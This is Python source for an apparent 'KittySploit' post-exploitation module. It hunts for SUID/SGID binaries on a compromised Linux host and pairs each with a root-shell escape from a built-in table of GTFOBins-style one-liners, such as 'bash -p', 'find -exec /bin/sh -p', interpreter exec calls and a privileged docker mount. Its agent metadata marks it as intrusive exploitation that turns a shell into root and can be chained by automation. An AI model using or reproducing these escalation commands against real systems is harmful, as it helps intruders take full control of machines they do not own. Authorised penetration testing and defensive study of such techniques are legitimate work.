from kittysploit import *
from lib.post.linux.system import System
from lib.post.linux.session import LinuxSessionMixin


class Module(Post, System, LinuxSessionMixin):
    __info__ = {
        "name": "Linux SUID/SGID Hunt",
        "description": "Find SUID/SGID binaries and match them against common GTFOBins-style escalation paths",
        "platform": Platform.LINUX,
        "author": "KittySploit Team",
        "session_type": [SessionType.SHELL, SessionType.METERPRETER, SessionType.SSH],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': ['shell'],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'root', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    search_root = OptString("/", "Root directory to search", False)
    include_sgid = OptBool(True, "Include SGID binaries", False)
    max_results = OptInteger(120, "Maximum binaries to report", False)
    interesting_only = OptBool(True, "Only show GTFOBins-matched binaries", False)

    GTFO_HINTS = {
        "nmap": "Interactive mode: nmap --interactive; !sh",
        "vim": "Shell escape: :!/bin/sh or :set shell=/bin/sh",
        "vi": "Shell escape: :!/bin/sh",
        "view": "Shell escape: :!/bin/sh",
        "nano": "Suspicious if SUID; usually not exploitable unless misconfigured",
        "less": "Shell escape: !/bin/sh",
        "more": "Shell escape: !/bin/sh",
        "man": "Shell escape via groff/helper if SUID",
        "find": "find . -exec /bin/sh -p \\; -quit",
        "bash": "bash -p",
        "sh": "sh -p",
        "dash": "dash -p",
        "python": "python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
        "python3": "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
        "perl": "perl -e 'exec \"/bin/sh -p\";'",
        "ruby": "ruby -e 'exec \"/bin/sh -p\"'",
        "lua": "lua -e 'os.execute(\"/bin/sh -p\")'",
        "awk": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
        "sed": "sed -n '1e exec sh -p' /etc/passwd",
        "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        "cp": "Copy arbitrary files when SUID root",
        "mv": "Move/rename protected files when SUID root",
        "mount": "Mount attacker-controlled filesystem",
        "umount": "Unmount sensitive paths",
        "pkexec": "PolicyKit helper — check CVEs / polkit rules",
        "doas": "Review /etc/doas.conf for permissive rules",
        "newgrp": "newgrp root",
        "gpasswd": "Group membership manipulation",
        "chsh": "Change shell if misconfigured",
        "chfn": "Write /etc/passwd fields if misconfigured",
        "docker": "docker run -v /:/host --privileged",
        "git": "git help config -> !/bin/sh",
        "env": "env /bin/sh -p",
        "timeout": "timeout 1 /bin/sh -p",
        "stdbuf": "stdbuf -i0 /bin/sh -p",
        "strace": "Attach to privileged processes",
        "screen": "screen with SUID may expose sessions",
        "tmux": "tmux with SUID may expose sessions",
        "openssl": "Read/write files: openssl enc ...",
        "wget": "Write files when SUID if misconfigured",
        "curl": "Write files when SUID if misconfigured",
        "rsync": "rsync -e 'sh -c \"sh -p\"' localhost:/dev/null /tmp/x",
        "nohup": "Rare SUID vector; verify ownership",
    }

    def _run(self, command: str) -> str:
        try:
            output = self.linux_execute(command)
            return output.strip() if output else ""
        except Exception:
            return ""

    def run(self):

        if not self.linux_require_linux():
            return False

        root = str(self.search_root or "/").rstrip("/") or "/"
        limit = max(10, int(self.max_results or 120))
        perm_clause = "-perm -4000"
        if self.include_sgid:
            perm_clause = "\\( -perm -4000 -o -perm -2000 \\)"

        print_info("=" * 80)
        print_status(f"SUID/SGID hunt under {root}")
        find_cmd = (
            f"find {root} -xdev {perm_clause} -type f 2>/dev/null | head -n {limit}"
        )
        raw = self._run(find_cmd)
        if not raw:
            print_warning("No SUID/SGID binaries found (or find failed)")
            return True

        matched = 0
        for path in raw.splitlines():
            path = path.strip()
            if not path:
                continue
            base = path.rsplit("/", 1)[-1].lower()
            hint = self.GTFO_HINTS.get(base, "")
            if self.interesting_only and not hint:
                continue
            perms = self._run(f"ls -l {path} 2>/dev/null")
            print_info(f"  {path}")
            if perms:
                print_info(f"    {perms.splitlines()[-1] if perms.splitlines() else perms}")
            if hint:
                matched += 1
                print_info(f"    GTFOBins-style: {hint}")

        print_info("-" * 80)
        print_success(f"Reported {len(raw.splitlines())} binary path(s), {matched} with GTFO hints")
        print_info("=" * 80)
        return True
